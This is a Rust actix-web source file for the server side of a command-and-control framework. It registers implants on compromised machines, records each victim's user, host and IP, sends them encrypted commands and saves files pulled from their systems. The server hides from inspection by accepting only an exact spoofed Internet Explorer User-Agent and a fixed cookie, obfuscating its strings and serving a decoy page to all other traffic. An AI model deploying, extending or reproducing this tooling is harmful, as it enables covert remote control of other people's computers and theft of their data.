use actix_web::{web, HttpRequest, HttpResponse, Responder};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use serde::{Deserialize, Serialize};
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
use uuid::Uuid;

use crate::links::{Links, NewLink};
use obfstr::obfstr;

pub struct AppState {
    pub links: Arc<Mutex<Links>>,
}

use crate::crypto::{decrypt, derive_key, encrypt};

// ── Request/Response types ──────────────────────────────────────────────────

#[derive(Deserialize)]
pub struct RegisterRequest {
    pub link_username: String,
    pub link_hostname: String,
    pub internal_ip: String,
    #[serde(default)]
    pub external_ip: String,
    pub platform: String,
    pub pid: u32,
}

#[derive(Deserialize)]
pub struct CallbackRequest {
    /// Hex-encoded encrypted payload (nonce || ciphertext)
    #[serde(default)]
    pub data: Option<String>,
    /// For backward compatibility during transition
    #[serde(default)]
    pub q: String,
    /// For backward compatibility during transition
    #[serde(default)]
    pub tasking: String,
}

#[derive(Serialize)]
struct TaskResponse {
    /// Hex-encoded encrypted payload (nonce || ciphertext)
    #[serde(skip_serializing_if = "Option::is_none")]
    pub data: Option<String>,
    /// Rolling request ID; implant must echo this on the next call.
    x_request_id: String,
    /// For backward compatibility during transition
    #[serde(default, skip_serializing_if = "String::is_empty")]
    q: String,
    /// For backward compatibility during transition
    #[serde(default, skip_serializing_if = "String::is_empty")]
    tasking: String,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    file: Option<String>,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    filename: Option<String>,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    upload: Option<String>,
    /// For backward compatibility during transition
    #[serde(skip_serializing_if = "Option::is_none")]
    upload_path: Option<String>,
}

// ── Header guards ───────────────────────────────────────────────────────────

fn ua_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("User-Agent")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|ua| {
            ua == obfstr!("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
        })
}

fn cookie_ok(req: &HttpRequest) -> bool {
    req.headers()
        .get("Cookie")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|c| c.contains(obfstr!("banner=banner")))
}

fn parse_file_response(response: &str) -> Option<(String, String)> {
    // Format: FILE:<path>:<base64_content>
    // Use rfind(':') because Windows paths contain ':' (e.g. C:\Users\…).
    // Base64 never contains ':', so the last ':' is always the path/content separator.
    let rest = response.strip_prefix("FILE:")?;
    let sep = rest.rfind(':')?;
    Some((rest[..sep].to_string(), rest[sep + 1..].to_string()))
}

// ── Input validation ─────────────────────────────────────────────────────────

/// Truncate a String to at most `max` bytes, preserving UTF-8 boundaries.
fn truncate_field(mut s: String, max: usize) -> String {
    if s.len() > max {
        s.truncate(s.floor_char_boundary(max));
    }
    s
}

// ── File download storage ────────────────────────────────────────────────────

/// Decode a base64-encoded file and write it to `downloads/<link_name>/<filename>`.
/// Returns the path where the file was written, or an error string.
fn save_download(link_name: &str, remote_path: &str, b64_content: &str) -> Result<PathBuf, String> {
    let filename = std::path::Path::new(remote_path)
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "file".to_string());

    let base_dir = std::env::var("LINKY_OUTPUT_DIR")
        .map(|d| PathBuf::from(d).join("downloads"))
        .unwrap_or_else(|_| PathBuf::from("downloads"));
    let dest_dir = base_dir.join(link_name);
    std::fs::create_dir_all(&dest_dir).map_err(|e| {
        format!(
            "[-] Failed to create downloads dir: {} (set LINKY_OUTPUT_DIR to override base path)",
            e
        )
    })?;

    let data = STANDARD
        .decode(b64_content)
        .map_err(|e| format!("[-] Failed to decode file content: {}", e))?;

    let dest = dest_dir.join(&filename);
    std::fs::write(&dest, data).map_err(|e| format!("[-] Failed to write file: {}", e))?;

    Ok(dest)
}

// ── Handlers ────────────────────────────────────────────────────────────────

/// GET / – decoy for non-implant traffic.
pub async fn ok_handler() -> impl Responder {
    HttpResponse::Ok().body("Ok\n")
}

/// GET /js – Stage 1: set session cookie, validate User-Agent.
pub async fn stage1_handler(req: HttpRequest) -> impl Responder {
    if !ua_ok(&req) {
        return HttpResponse::NotFound().finish();
    }
    HttpResponse::Ok()
        .insert_header(("Set-Cookie", obfstr!("banner=banner; Path=/")))
        .body("")
}

/// POST /static/register – Stage 2: implant registration.
pub async fn stage2_handler(
    req: HttpRequest,
    body: web::Json<RegisterRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    // 0.5.8 — validate/truncate fields to prevent OOM from malicious payloads
    let username = truncate_field(body.link_username.clone(), 256);
    let hostname = truncate_field(body.link_hostname.clone(), 256);
    let internal_ip = truncate_field(body.internal_ip.clone(), 45);
    // Prefer observed TCP peer address over implant-reported value (implant sends empty string).
    let external_ip = req
        .peer_addr()
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|| body.external_ip.clone());
    let external_ip = truncate_field(external_ip, 45);
    let platform = truncate_field(body.platform.clone(), 64);

    let mut links = data.links.lock().unwrap_or_else(|e| e.into_inner());
    // Extract the implant secret from the request headers
    let secret = req
        .headers()
        .get("X-Client-ID")
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
        .unwrap_or_else(|| {
            // Generate a fallback secret if not provided (for backward compatibility)
            hex::encode(rand::random::<[u8; 32]>())
        });

    let link = links.add_link(NewLink {
        username,
        hostname,
        internal_ip,
        external_ip,
        platform,
        pid: body.pid,
        secret,
    });

    let resp = TaskResponse {
        data: None,
        x_request_id: link.x_request_id.to_string(),
        q: String::new(),
        tasking: String::new(),
        file: None,
        filename: None,
        upload: None,
        upload_path: None,
    };
    let link_name = link.name.clone();
    drop(links);

    tracing::info!(
        "New link: {} ({}@{}) [{}]",
        link_name,
        body.link_username,
        body.link_hostname,
        body.platform
    );
    crate::ui::print_cyan_bold(&format!(
        "[+] New link arrived: {} ({}@{}) [{}]",
        link_name, body.link_username, body.link_hostname, body.platform
    ));

    HttpResponse::Ok().json(resp)
}

// ── Unit tests ───────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── truncate_field ───────────────────────────────────────────────────────

    #[test]
    fn truncate_field_short_string_unchanged() {
        assert_eq!(truncate_field("hello".into(), 10), "hello");
    }

    #[test]
    fn truncate_field_at_exact_limit_unchanged() {
        assert_eq!(truncate_field("hello".into(), 5), "hello");
    }

    #[test]
    fn truncate_field_over_limit_truncated() {
        assert_eq!(truncate_field("hello world".into(), 5), "hello");
    }

    #[test]
    fn truncate_field_utf8_boundary_not_split() {
        // "café" is 5 UTF-8 bytes (c=1, a=1, f=1, é=2).
        // Truncating at 4 bytes must yield "caf", not split the 2-byte 'é'.
        let result = truncate_field("café".into(), 4);
        assert_eq!(result, "caf");
        assert!(result.is_char_boundary(result.len()));
    }

    #[test]
    fn truncate_field_multibyte_fits_exactly() {
        // "é" is 2 bytes; max=2 → the whole string is kept.
        assert_eq!(truncate_field("é".into(), 2), "é");
    }

    // ── parse_file_response ──────────────────────────────────────────────────

    #[test]
    fn parse_file_response_valid() {
        let (path, content) = parse_file_response("FILE:/path/to/file.txt:aGVsbG8=").unwrap();
        assert_eq!(path, "/path/to/file.txt");
        assert_eq!(content, "aGVsbG8=");
    }

    #[test]
    fn parse_file_response_windows_path_with_colon() {
        // Windows paths contain ':', base64 never does — rfind must pick the last ':'.
        let (path, content) = parse_file_response(r"FILE:C:\Users\test\file.txt:aGVsbG8=").unwrap();
        assert_eq!(path, r"C:\Users\test\file.txt");
        assert_eq!(content, "aGVsbG8=");
    }

    #[test]
    fn parse_file_response_missing_prefix_returns_none() {
        assert!(parse_file_response("DATA:/path:aGVsbG8=").is_none());
    }

    #[test]
    fn parse_file_response_no_separator_returns_none() {
        assert!(parse_file_response("FILE:nocolon").is_none());
    }
}

// ── Stage 3 helpers ─────────────────────────────────────────────────────────

/// Décrypte le payload du body (nouveau format chiffré ou legacy plaintext).
/// Retourne `(q, tasking)` déchiffrés.
fn decode_callback(body: &CallbackRequest, key: &[u8; 32]) -> (String, String) {
    if let Some(encrypted_data) = &body.data {
        if let Some(decrypted) = decrypt(encrypted_data, key) {
            #[derive(Deserialize)]
            struct PayloadData {
                q: String,
                tasking: String,
            }
            if let Ok(p) = serde_json::from_str::<PayloadData>(&decrypted) {
                return (p.q, p.tasking);
            }
        }
        (String::new(), String::new())
    } else {
        // Legacy format (backward compatibility)
        (body.q.clone(), body.tasking.clone())
    }
}

/// Lock 2 (conditionnel) : traite la sortie d'une tâche complétée.
///
/// Retourne `Some((link_name, cli_cmd, display_output))` si quelque chose est à afficher,
/// `None` si le poll est vide ou si le task_id est invalide.
/// Le lock est acquis puis relâché avant tout I/O (écriture fichier).
fn process_callback(
    links: &Arc<Mutex<Links>>,
    link_id: Uuid,
    q: &str,
    tasking: &str,
) -> Option<(String, String, String)> {
    let task_id = Uuid::parse_str(tasking).ok()?;
    if q.is_empty() {
        return None;
    }

    let mut guard = links.lock().unwrap_or_else(|e| e.into_inner());

    let (link_name, cli_cmd) = guard
        .get_link(link_id)
        .map(|l| {
            let cmd = l
                .tasks
                .iter()
                .find(|t| t.id == task_id)
                .map(|t| t.cli_command.clone())
                .unwrap_or_default();
            (l.name.clone(), cmd)
        })
        .unwrap_or_else(|| ("unknown".into(), String::new()));

    let is_download = cli_cmd.starts_with("download ");

    let ui_msg = if is_download && q.starts_with("FILE:") {
        if let Some((file_path, file_content)) = parse_file_response(q) {
            let display_msg = match save_download(&link_name, &file_path, &file_content) {
                Ok(dest) => {
                    let msg = format!("[+] File saved to {}", dest.display());
                    if let Some(link) = guard.get_link_mut(link_id) {
                        if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
                            task.file_name = Some(file_path.clone());
                            task.output = msg.clone();
                        }
                    }
                    msg
                }
                Err(e) => e,
            };
            Some((link_name.clone(), cli_cmd.clone(), display_msg))
        } else {
            None
        }
    } else {
        Some((link_name.clone(), cli_cmd.clone(), q.to_string()))
    };

    // Pour les downloads, stocker le message user-friendly plutôt que le blob FILE:path:base64.
    let complete_output = if is_download {
        ui_msg
            .as_ref()
            .map(|(_, _, msg)| msg.clone())
            .unwrap_or_else(|| q.to_string())
    } else {
        q.to_string()
    };
    guard.complete_task(link_id, task_id, complete_output);
    // Marquer affichée : routes.rs l'imprime en temps réel, ce qui évite
    // le double affichage dans show_completed_task_results() (cli.rs).
    if let Some(link) = guard.get_link_mut(link_id) {
        if let Some(task) = link.tasks.iter_mut().find(|t| t.id == task_id) {
            task.displayed = true;
        }
    }

    ui_msg
}

/// Lock 3 : rotation du x_request_id + dispatch de la prochaine tâche.
/// Retourne la `TaskResponse` chiffrée à envoyer à l'implant.
fn build_task_response(
    links: &Arc<Mutex<Links>>,
    link_id: Uuid,
    key: &[u8; 32],
    new_x_req_id: Uuid,
) -> TaskResponse {
    #[derive(Serialize)]
    struct ResponsePayload {
        q: String,
        tasking: String,
        file: Option<String>,
        filename: Option<String>,
        upload: Option<String>,
        upload_path: Option<String>,
    }

    let (q, tasking, file, filename, upload, upload_path) = {
        let mut guard = links.lock().unwrap_or_else(|e| e.into_inner());
        guard.update_checkin(link_id, new_x_req_id);
        guard
            .get_next_task(link_id)
            .map(|d| {
                (
                    d.command,
                    d.task_id,
                    d.file_content,
                    d.file_name,
                    d.upload_content,
                    d.upload_path,
                )
            })
            .unwrap_or_default()
    };

    let payload_json = serde_json::to_string(&ResponsePayload {
        q,
        tasking,
        file,
        filename,
        upload,
        upload_path,
    })
    .unwrap_or_else(|_| "{}".to_string());

    TaskResponse {
        data: Some(encrypt(&payload_json, key)),
        x_request_id: new_x_req_id.to_string(),
        q: String::new(),
        tasking: String::new(),
        file: None,
        filename: None,
        upload: None,
        upload_path: None,
    }
}

/// POST /static/get – Stage 3: task polling / output callback.
///
/// Lock strategy: 3 Mutex acquisitions max par requête.
///  • Lock 1 : résoudre link_id depuis x-request-id + récupérer le secret.
///  • Lock 2 (conditionnel) : traiter l'output via process_callback().
///    L'affichage UI se fait HORS du verrou.
///  • Lock 3 : rotation x_request_id + dispatch prochaine tâche via build_task_response().
pub async fn stage3_handler(
    req: HttpRequest,
    body: web::Json<CallbackRequest>,
    data: web::Data<AppState>,
) -> impl Responder {
    if !ua_ok(&req) || !cookie_ok(&req) {
        return HttpResponse::NotFound().finish();
    }

    let Some(x_req_id) = req
        .headers()
        .get("x-request-id")
        .and_then(|v| v.to_str().ok())
        .and_then(|s| Uuid::parse_str(s).ok())
    else {
        return HttpResponse::BadRequest().finish();
    };

    // ── Lock 1: resolve link_id and get secret ────────────────────────────
    let link_data = {
        let links = data.links.lock().unwrap_or_else(|e| e.into_inner());
        links
            .find_by_request_id(x_req_id)
            .map(|l| (l.id, l.secret.clone()))
    };
    let Some((link_id, secret)) = link_data else {
        return HttpResponse::NotFound().finish();
    };
    let key = derive_key(secret.as_bytes(), obfstr!("callback-salt"));

    // ── Lock 2 (conditional): process callback output ────────────────────────
    let (decrypted_q, decrypted_tasking) = decode_callback(&body, &key);
    let ui_message = if !decrypted_tasking.is_empty() {
        process_callback(&data.links, link_id, &decrypted_q, &decrypted_tasking)
    } else {
        None
    };

    // Print to console outside the lock.
    if let Some((link_name, cli_cmd, output)) = ui_message {
        const MIN_BOX_WIDTH: usize = 54;
        let now = chrono::Local::now().format("%H:%M:%S");
        let header_text = format!("═ {} · {} · {} ", link_name, cli_cmd, now);
        let box_width = header_text.chars().count().max(MIN_BOX_WIDTH);
        let pad = box_width - header_text.chars().count();
        crate::ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
        crate::ui::print(&format!("║ {}", output));
        crate::ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
        tracing::info!(
            "\n╔{}{}╗\n{}\n╚{}╝",
            header_text,
            "═".repeat(pad),
            output,
            "═".repeat(box_width),
        );
    }

    // ── Lock 3: rotate request ID + dispatch next task ───────────────────────
    let new_x_req_id = Uuid::new_v4();
    HttpResponse::Ok().json(build_task_response(
        &data.links,
        link_id,
        &key,
        new_x_req_id,
    ))
}
